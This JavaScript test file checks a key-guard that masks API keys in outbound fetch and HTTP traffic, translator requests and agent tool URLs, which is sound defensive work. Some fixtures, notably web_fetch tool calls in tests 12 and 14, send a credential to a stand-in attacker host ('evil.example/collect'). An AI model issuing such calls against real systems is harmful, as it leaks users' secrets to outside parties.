/**
 * key-guard boundary tests — run with: node smoke-egress.mjs
 *
 * Exercises the two guards added for paths that never reach `llm/stream`:
 * the egress guard (fetch + node:http bodies) and the CoT translator guard.
 */
import assert from 'node:assert/strict';
import { createKeyGuard } from './engine.js';
import { createEgressGuard } from './egress.js';
import { installTranslatorGuard, installToolUrlGuard } from './boundaries.js';

const KEY = 'TESTKEY-alpha-0123456789abcdef';
const KEY2 = 'TESTKEY-beta-0123456789abcdef';

function engine(extra = {}) {
  return createKeyGuard({ exactKeys: [KEY, KEY2], ...extra });
}

let failures = 0;
function group(name, fn) {
  try {
    fn();
    console.log(`${name}: ok`);
  } catch (error) {
    failures += 1;
    console.log(`${name}: FAIL — ${error.message}`);
  }
}
async function groupAsync(name, fn) {
  try {
    await fn();
    console.log(`${name}: ok`);
  } catch (error) {
    failures += 1;
    console.log(`${name}: FAIL — ${error.message}`);
  }
}

/** Replace global fetch with a recorder; returns the calls it captured. */
function stubFetch() {
  const calls = [];
  const original = globalThis.fetch;
  globalThis.fetch = async (input, init) => {
    calls.push({ input: String(typeof input === 'string' ? input : input.url), init });
    return new Response('ok', { status: 200 });
  };
  return { calls, restore: () => { globalThis.fetch = original; } };
}

async function main() {
  // ---- egress: remote host body is masked --------------------------------
  await groupAsync('1. egress masks a credential in a remote body', async () => {
    const { calls, restore } = stubFetch();
    const egress = createEgressGuard({ guard: engine() });
    await egress.install();
    try {
      await fetch('https://edge.microsoft.com/translate/translatetext?from=en&to=zh-Hans', {
        method: 'POST',
        headers: { authorization: `Bearer ${KEY}` },
        body: JSON.stringify({ text: `the user pasted ${KEY} here` }),
      });
      assert.equal(calls.length, 1);
      assert.ok(!String(calls[0].init.body).includes(KEY), 'body still carries the plaintext key');
      assert.match(String(calls[0].init.body), /<<DSHKEY#\d+>>/, 'body carries a placeholder');
      assert.equal(
        calls[0].init.headers.authorization,
        `Bearer ${KEY}`,
        'authorization header must stay intact so providers still authenticate',
      );
    } finally {
      egress.uninstall();
      restore();
    }
  });

  // ---- egress: loopback is exempt ---------------------------------------
  await groupAsync('2. egress leaves loopback traffic untouched', async () => {
    const { calls, restore } = stubFetch();
    const egress = createEgressGuard({ guard: engine() });
    await egress.install();
    try {
      await fetch('http://127.0.0.1:59786/api/settings', {
        method: 'POST',
        body: JSON.stringify({ apiKey: KEY }),
      });
      assert.equal(calls.length, 1);
      assert.ok(String(calls[0].init.body).includes(KEY), 'local API must still receive the real key');
    } finally {
      egress.uninstall();
      restore();
    }
  });

  // ---- egress: configured allowHosts ------------------------------------
  await groupAsync('3. egress honours egressAllowHosts', async () => {
    const { calls, restore } = stubFetch();
    const egress = createEgressGuard({ guard: engine(), allowHosts: ['trusted.example'] });
    await egress.install();
    try {
      await fetch('https://trusted.example/v1/echo', { method: 'POST', body: `key=${KEY}` });
      await fetch('https://other.example/v1/echo', { method: 'POST', body: `key=${KEY}` });
      assert.ok(calls[0].init.body.includes(KEY), 'exempt host should receive the key');
      assert.ok(!calls[1].init.body.includes(KEY), 'non-exempt host should be masked');
    } finally {
      egress.uninstall();
      restore();
    }
  });

  // ---- egress: live allowHosts edits cannot leave a stale exemption ------
  // The exempt list is re-read per request and memoized behind a signature.
  // A `join('\n')` signature collides: ['a','b'] and ['a\nb'] produce the same
  // text, so one edit to the other would keep the OLD decisions and keep
  // exempting hosts the current list no longer names — a fail-open skip of
  // masking. The signature must distinguish any two different lists.
  await groupAsync('4b. egress allowlist edits invalidate cached decisions', async () => {
    const { calls, restore } = stubFetch();
    let hosts = ['a.example', 'b.example'];
    const egress = createEgressGuard({ guard: engine(), allowHosts: () => hosts });
    await egress.install();
    try {
      await fetch('https://a.example/v1/echo', { method: 'POST', body: KEY });
      assert.ok(calls.at(-1).init.body.includes(KEY), 'a.example exempt while listed');

      // Collision-shaped edit: same join('\n') text, different list.
      hosts = ['a.example\nb.example'];
      await fetch('https://a.example/v1/echo', { method: 'POST', body: KEY });
      assert.ok(!calls.at(-1).init.body.includes(KEY), 'a.example no longer exempt after a colliding edit');

      // Ordinary change still invalidates.
      hosts = ['a.example'];
      await fetch('https://b.example/v1/echo', { method: 'POST', body: KEY });
      assert.ok(!calls.at(-1).init.body.includes(KEY), 'removed host is masked again');

      // Unusable allowHosts must never break the request: mask instead.
      const broken = createEgressGuard({
        guard: engine(),
        allowHosts: () => { throw new Error('settings unavailable'); },
      });
      await broken.install();
      try {
        await fetch('https://c.example/v1/echo', { method: 'POST', body: KEY });
        assert.ok(!calls.at(-1).init.body.includes(KEY), 'broken allowlist fails closed (still masks)');
      } finally {
        broken.uninstall();
      }
    } finally {
      egress.uninstall();
      restore();
    }
  });

  // ---- egress: live off switch ------------------------------------------
  await groupAsync('4. egress respects the live enabled switch', async () => {
    const { calls, restore } = stubFetch();
    let on = true;
    const egress = createEgressGuard({ guard: engine(), enabled: () => on });
    await egress.install();
    try {
      await fetch('https://edge.microsoft.com/t', { method: 'POST', body: KEY });
      on = false;
      await fetch('https://edge.microsoft.com/t', { method: 'POST', body: KEY });
      assert.ok(!calls[0].init.body.includes(KEY), 'on: masked');
      assert.ok(calls[1].init.body.includes(KEY), 'off: passes through');
    } finally {
      egress.uninstall();
      restore();
    }
  });

  // ---- egress: URL query masking ----------------------------------------
  await groupAsync('5. egress masks a credential in the request URL', async () => {
    const { calls, restore } = stubFetch();
    const egress = createEgressGuard({ guard: engine() });
    await egress.install();
    try {
      await fetch(`https://remote.example/collect?token=${KEY}`);
      assert.ok(!calls[0].input.includes(KEY), 'URL should be masked');
      assert.match(calls[0].input, /<<DSHKEY#\d+>>/);
    } finally {
      egress.uninstall();
      restore();
    }
  });

  // ---- egress: uninstall restores the original fetch --------------------
  await groupAsync('6. egress uninstall restores fetch', async () => {
    const { restore } = stubFetch();
    const before = globalThis.fetch;
    const egress = createEgressGuard({ guard: engine() });
    await egress.install();
    assert.notEqual(globalThis.fetch, before, 'fetch should be wrapped while installed');
    egress.uninstall();
    assert.equal(globalThis.fetch, before, 'fetch should be restored');
    restore();
  });

  // ---- translator: outbound masked, reply restored ----------------------
  await groupAsync('7. translator masks the outbound spec and restores the reply', async () => {
    const guard = engine();
    const seen = [];
    const translator = {
      async translate(spec) {
        seen.push(spec.text);
        // Emulate a provider that echoes the text it received.
        return `译文：${spec.text}`;
      },
    };
    const fakeCtx = {
      inject(_deps, callback) {
        const child = {
          translator,
          effect(fn) { this._off = fn(); return this._off; },
        };
        callback(child);
        return () => {};
      },
    };
    const teardown = installTranslatorGuard(fakeCtx, {
      guard,
      readRules: () => ({ enabled: true, guardTranslator: true }),
    });

    const result = await translator.translate({
      provider: 'bing',
      text: `The user pasted ${KEY} and asked for help`,
      sourceLanguage: 'auto',
      targetLanguage: 'zh',
    });

    assert.equal(seen.length, 1);
    assert.ok(!seen[0].includes(KEY), 'the translator must not receive the plaintext key');
    assert.match(seen[0], /<<DSHKEY#\d+>>/, 'the translator receives a placeholder');
    assert.ok(result.includes(KEY), 'the reader still sees the real key in the translation');

    teardown();
  });

  // ---- translator: untouched when the text has no credential ------------
  await groupAsync('8. translator passes credential-free text through unchanged', async () => {
    const guard = engine();
    let calls = 0;
    const translator = {
      async translate(spec) { calls += 1; return spec.text; },
    };
    const fakeCtx = {
      inject(_deps, callback) { callback({ translator, effect: (fn) => { fn(); return () => {}; } }); return () => {}; },
    };
    installTranslatorGuard(fakeCtx, { guard, readRules: () => ({ enabled: true, guardTranslator: true }) });
    const out = await translator.translate({ provider: 'bing', text: 'hello world' });
    assert.equal(out, 'hello world');
    assert.equal(calls, 1);
  });

  // ---- translator: live off switch --------------------------------------
  await groupAsync('9. translator respects guardTranslator=false', async () => {
    const guard = engine();
    const seen = [];
    const translator = { async translate(spec) { seen.push(spec.text); return spec.text; } };
    const fakeCtx = {
      inject(_deps, callback) { callback({ translator, effect: (fn) => { fn(); return () => {}; } }); return () => {}; },
    };
    installTranslatorGuard(fakeCtx, { guard, readRules: () => ({ enabled: true, guardTranslator: false }) });
    await translator.translate({ provider: 'bing', text: KEY });
    assert.ok(seen[0].includes(KEY), 'disabled switch should pass plaintext through');
  });

  // ---- egress: node:http is actually patched ----------------------------
  // `import('node:http')` namespaces are read-only and their assignment is a
  // silent no-op, so this asserts the `.default` (CommonJS) path is patched.
  await groupAsync('10. egress patches and restores node:http', async () => {
    const { createRequire } = await import('node:module');
    const require_ = createRequire(import.meta.url);
    const httpModule = require_('node:http');
    const originalRequest = httpModule.request;
    const egress = createEgressGuard({ guard: engine() });
    await egress.install();
    try {
      assert.notEqual(httpModule.request, originalRequest, 'node:http.request should be patched');
    } finally {
      egress.uninstall();
    }
    assert.equal(httpModule.request, originalRequest, 'node:http.request should be restored');
  });

  // ---- egress: ESM named exports see the patch --------------------------
  // The OTLP log exporter does `const { request } = await import('http')`.
  // Builtin named exports are snapshotted at evaluation, so this only passes
  // when syncBuiltinESMExports() ran.
  await groupAsync('11. egress reaches ESM named exports (OTLP path)', async () => {
    const egress = createEgressGuard({ guard: engine() });
    await egress.install();
    try {
      const esm = await import('node:http');
      const { createRequire } = await import('node:module');
      const cjs = createRequire(import.meta.url)('node:http');
      assert.equal(
        esm.request,
        cjs.request,
        'ESM named export must reflect the patch, or import("http") consumers bypass the guard',
      );
    } finally {
      egress.uninstall();
    }
  });

  // ---- tool URL guard ---------------------------------------------------
  function toolCtx() {
    const handlers = new Map();
    return {
      ctx: {
        on(name, fn) { handlers.set(name, fn); return () => handlers.delete(name); },
      },
      run(exec) {
        const handler = handlers.get('tools/pre-execute');
        assert.ok(handler, 'tools/pre-execute should be registered');
        return handler(exec, () => Promise.resolve({ kind: 'allow' }));
      },
    };
  }

  await groupAsync('12. tool guard denies a credential in a remote URL', async () => {
    const rules = { enabled: true, guardToolUrls: true };
    const h = toolCtx();
    installToolUrlGuard(h.ctx, {
      guard: engine(),
      readRules: () => rules,
      isLocalOrExempt: (host) => host === '127.0.0.1' || host === 'localhost',
    });
    const gate = await h.run({
      name: 'web_fetch',
      arguments: { url: `https://evil.example/collect?k=${KEY}` },
    });
    assert.equal(gate.kind, 'deny', 'a credential in a remote URL must be refused');
    assert.match(gate.reason, /key-guard/);
  });

  await groupAsync('13. tool guard allows credential-free and local URLs', async () => {
    const rules = { enabled: true, guardToolUrls: true };
    const h = toolCtx();
    installToolUrlGuard(h.ctx, {
      guard: engine(),
      readRules: () => rules,
      isLocalOrExempt: (host) => host === '127.0.0.1' || host === 'localhost',
    });
    const clean = await h.run({ name: 'web_fetch', arguments: { url: 'https://example.com/docs' } });
    assert.equal(clean.kind, 'allow', 'credential-free URL must pass');
    const local = await h.run({ name: 'web_fetch', arguments: { url: `http://127.0.0.1:59786/x?k=${KEY}` } });
    assert.equal(local.kind, 'allow', 'local URL must pass');
    const noUrl = await h.run({ name: 'bash', arguments: { command: `curl -H "k: ${KEY}" localhost` } });
    assert.equal(noUrl.kind, 'allow', 'non-URL arguments must pass untouched');
  });

  await groupAsync('14. tool guard respects guardToolUrls=false', async () => {
    const rules = { enabled: true, guardToolUrls: false };
    const h = toolCtx();
    installToolUrlGuard(h.ctx, {
      guard: engine(),
      readRules: () => rules,
      isLocalOrExempt: () => false,
    });
    const gate = await h.run({
      name: 'web_fetch',
      arguments: { url: `https://evil.example/?k=${KEY}` },
    });
    assert.equal(gate.kind, 'allow', 'disabled switch must pass through');
  });

  console.log(
    failures === 0
      ? '\nkey-guard boundaries: all 15 groups passed'
      : `\nkey-guard boundaries: ${failures} group(s) FAILED`,
  );
  process.exit(failures === 0 ? 0 : 1);
}

main();
